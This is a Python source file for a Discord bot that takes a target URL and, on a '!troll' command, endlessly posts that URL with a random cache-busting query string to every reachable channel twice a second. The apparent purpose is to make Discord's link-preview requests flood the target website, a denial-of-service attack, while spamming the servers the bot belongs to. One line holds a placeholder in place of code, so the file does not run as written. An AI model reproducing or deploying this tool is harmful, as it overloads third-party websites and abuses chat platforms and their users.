import discord
import config
import random
import asyncio
import requests
import os
from config import token, link, prefix, ownerid
from discord.ext import tasks

url = input("URL: ")
headers = { 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0' }
r = requests.get(f"{url}", headers=headers)
if r.status_code == 200:
    print("[+] URL Check Passed [+]")
else:
    print("[-] URL Check Failed, please check if your URL is valid or blocked. [-]")
    exit()

def make_string(length):
    return ''.join(random.choice('1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm') for i in range (length))

class MyClient(discord.Client):
    async def on_ready(self):
        os.system('clear;cls')
        print(f'Logged in as: {self.user.name}')
        print(f'ID: {self.user.id}')
        print(f'Target URL: {url}')
        ready = client.get_channel(PUT A CHANNEL ID HERE!!)
        await ready.send(f"Bot ready - Current target is set to: `{url}`")

    async def on_message(self, message):
        if message.content.startswith('!troll'):
            while True:
                channel = client.get_all_channels()
                for channel in client.get_all_channels():
                    try:
                        await channel.send(f"{url}?{make_string(25)}")
                        await asyncio.sleep(0.5)
                    except:
                        print("Error occured - Ignoring like a giga chad.")


client = MyClient()
client.run(token)
